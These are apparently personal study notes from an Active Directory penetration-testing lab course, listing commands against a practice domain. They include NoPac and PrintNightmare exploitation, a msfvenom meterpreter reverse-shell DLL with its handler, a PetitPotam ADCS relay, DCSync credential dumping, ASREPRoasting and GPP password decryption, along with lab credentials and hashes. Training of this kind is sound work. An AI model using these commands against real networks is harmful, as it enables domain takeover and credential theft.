# Stacking the Deck

## Priviliged Access

There are several other ways we can move around a Windows domain:

- `Remote Desktop Protocol` (`RDP`) - is a remote access/management protocol that gives us GUI access to a target host
- [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2) - also referred to as PSRemoting or Windows Remote Management (WinRM)
access, is a remote access protocol that allows us to run commands or
enter an interactive command-line session on a remote host using
PowerShell
- `MSSQL Server` - an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute
queries against the database. This access can be used to run operating
system commands in the context of the SQL Server service account through various methods
- from a Linux host (`mssqlclient.py` and `evil-winrm`)

## Remote Desktop

- Enumerating the Remote Desktop Users Group using PowerView
    - `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"`
        - INLANEFREIGHT\Domain Users → all users in the domain can RDP to this host
- to test rdp: `xfreerdp` or `Remmina` from our VM or the Pwnbox or `mstsc.exe`

## WinRM

- From Windows

```powershell
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -ForcePS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> hostname
ACADEMY-EA-MS01
[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> Exit-PSSession
PS C:\htb>
```

- From Linux

```bash
evil-winrm -i 10.129.201.234 -u forend
```

## SQL Server Admin

- Windows
    - Enumerating MSSQL Instances with PowerUpSQL
        
        ```powershell
        PS C:\htb> cd .\PowerUpSQL\
        PS C:\htb>  Import-Module .\PowerUpSQL.ps1
        PS C:\htb>  Get-SQLInstanceDomain
        Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
        ```
        
- Linux
    - mssqlclient.py
    - `mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth`
        - If the account has appropriate rights we can run inside the [mssqlclient.py](http://mssqlclient.py) session `enable_xp_cmdshell` to run OS commands using `xp_cmdshell <command>`

# Bleeding Edge Vulnerabilities

## NoPac (SamAccountName Spoofing)

<aside>
💡

- CVE [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) → bypasses a vulnerability with the Security Account Manager (SAM)
- CVE [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287) → vulnerability within the Kerperos Privilige Attribute Certificate (PAC) in ADDS

This exploit takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller.

</aside>

- Shell access

`sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap`

- DCSunc the Built-in Administrator

`sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator`

- ‘ **Impersonating the domain controller to retrieve credentials from the database**’
- SMBExec.py
    - If an AV or EDR is enabled, even though we get a shell session, it is likely that our commands will fail.
    - what [smbexec.py](http://smbexec.py) does is it creates a service called BTOBTO ant another service called BTOBO. temporary bat file is created which is then executed
        - windows defender will quarentine this and alert admins
        - If we need to be quite, [smbexec.py](http://smbexec.py) is probably not the best option

## PrintNightmare

<aside>
💡

CVE-2021-34527

CVE-2021-1675

Found in print spooler service that runs on all Windows OSs

`git clone https://github.com/cube0x0/CVE-2021-1675.git`

For this attack to work we need cube0x0 version of impacket
`git clone https://github.com/cube0x0/impacket`

</aside>

- Enumerating for Print System Asynchronous Protocol and Print System Remote Protocol
    - [`rpcdump.py](http://rpcdump.py) @172.16.5.5 | egrep ‘MS-RPRN|MS-PAR’`
- Generating a DLL Payload using msfvenom
    - `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll`
- Creating a smb share to host our payload
    - `sudo smbserver.py -smb2support CompData /path/to/directory_of_backupscript.dll`
- msfconsole
    - `use exploit/multi/handler`
    - `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
    - `set LHOST <LOCAL HOST>`
    - `set LPORT <LOCAL PORT>`
    - `exploit`
- Run the PrintNightmare exploit
    - `sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'`

## PetitPotam

<aside>
💡

CVE-2021-36942

LSA spoofing vulnerability that was pathec in August of 2021

Coerces a Domain Controller to authenticate against another host using NTLM over port 445 via the Local Security Authority Remote Protocol (LSARPC) by using Microsoft’s Encrypting File System Remote Protocol (MS-EFSRPC)

</aside>

- NtlmRelayX.py
    - Specifying the Web Enrollment URL for the CA host. If we don’t lknow the location of CA, we could use a tool such as certi to attempt to locate it.
    - `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/serfnsh.asp --adcs --template DomainController`
- In another window running PetitPotam
    - `python3 PetitPotam.py <attack host IP> <Domain Controller IP>`
- Requesting TGT using our base64 encoded certificate with gettgtpkinit.py
    - `python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache`
- **Setting the KRB5CCNAME Environment Variable**
    - `export KRB5CCNAME=dc01.ccache`
- Using dc tgt to DCSync
    - `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`
- Confirming Admin Access using CME
    - `crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf`
- Submitting a TGS request for ourselves using getnthash.pt
    - `python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$`
- Using DC NTLM Hash to DCSYnc
    - `secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba`

# Miscalleneous Misconfigurations

## Exchange related group membership

<aside>
💡

A defult installation of Microsoft Exchange within AD environment (no split-administration model) → many attack vectors.

</aside>

The group Exchange Windows Permissions is not listed as a protected group, but members are granted the ability to write a DACL to the domain object. This can be leveraged to perform a DCSync

Users logging into Exchange server keep their credentials in the cache. If we can compromise Exchange server, that will probably lead to Domain Admin priviliges → dumping hashes

## PrivExchange

- Flaw in the Exchange server PushSubscription feature which allows any domain user with a mailbox to force the exchange server to authenticate to any host provided by the client over HTTP.
- The exchange service runs as SYSTEM and is over-priviliged by default (has WriteDacl priviliges on the domain pre-2019 Cumulative Update). This flaw can be leveraged to relay to LDAP and dmp the domain NTDS database

## Printer Bug

- A bug in the MS-RPRN protocol (print system remote protocol → defines the communication of print job processing and print system management between client and print server)
- Any domain user can connect to the spool’s name pipe with the `RpcOpenPrinter` method and use `RpcRemoteFindFirstPrinterChangeNotificationEx`

- Enumerating MS-RPN Printer Bug Windows
    
    ```powershell
    Invoke-Module .\SecurityAssessment.ps1
    Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
    ```
    

## MS14-068

<aside>
💡

Flaw in kerberos, priv.esc. Kerberos ticket contains information about a user, including the account name, ID, and group membership in the Privilige Attribute Certificate (PAC)

Vulnerability allowed a forged PAC to be accepted by the KDC as legitimate.

</aside>

## Sniffing LDAP Credentials

<aside>
💡

beware of printers

</aside>

## Enumerating DNS Records

`adidnsdump` will allows us to enumerate all DNS records in a domain using a valid domain user account. If we can access DNS entries in AD, we can potentially discover interesting DNS records 

`adidnsdump -u inlanefreight\\forend ldap://172.16.5.5` 

→ creates a records.csv

## Other misconfigurations

- Look out for descriptions

## PASSWD_NOTREQD Field

It is possible to come across domain accounts with the passwd_notreqd fields set in the userAccountControl attribute. If this is set, user is bot subject to the current password policy

(Password may be blank because of lazy admins)

- Checking for PASSWD_NOTREQD field
    - `Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol`

## Credentials in SMB Shares and SYSVOL Scripts

<aside>
💡

SYSVOL can be a treasure trove of data

check for them

</aside>

## Group Policy Preferences (GPP) Passwords

- Map drives (drives.xml)
- Create local users
- Create printer config files (printers.xml)
- Creating and updating services (services.xml)
- Creating schdeduled tasks (scheduledtasks.xml)
- Changing local admin passwords

if you retrieve an encrypted gpp password it can be decrypted using `gpp-decrpyt <password>`

- Locating GPP Passwords with CrackMapExec
    - `crackmapexec smb -L | grep gpp`
- Using CrackMapExec’s gpp_autologin
    - `crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin`

## ASREPRoasting

<aside>
💡

It is possible to obtain the TGT for any account that has the *Do not require Kerberos pre-authentication* setting enabled

</aside>

<aside>
💡

ASREPRoasting is similar to Kerberoasting, but involved atting the AS-REP. (SPN is not required). If an attacker has GenericWrite or GenericAll permission over an account they can obtain the ticket for offlien cracking

</aside>

**Windows**

- Retrieving the users with **DONT_REQ_PREAUTH**

`Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl`

- Retrieving AS-REP using Rubeus
    - `.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat`

**Linux**

- Retrieving AS-REP using Kerbrute
    - `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt`
- Hunting users with kerberoast Pre-auth not required
    - `GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users`

## GPO Abuse

<aside>
💡

GPO misconfigs will cause vulns.

</aside>

**Windows**

- Enumerating GPO with PowerView
    - `Get-DomainGPO | select displayname`
    - Then you can check if the user has any access to any of these GPOs
- Enumerating GPO Names with a built-in cmdlet
    - `Get-GPO -All | Select DisplayName`
- Enumerating Domain user GPO Rights
    - `$sid=Convert-NameToSid "Domain Users"`
    - `Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}`
        - We retrieve the GUID to translate it:
    - `Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532`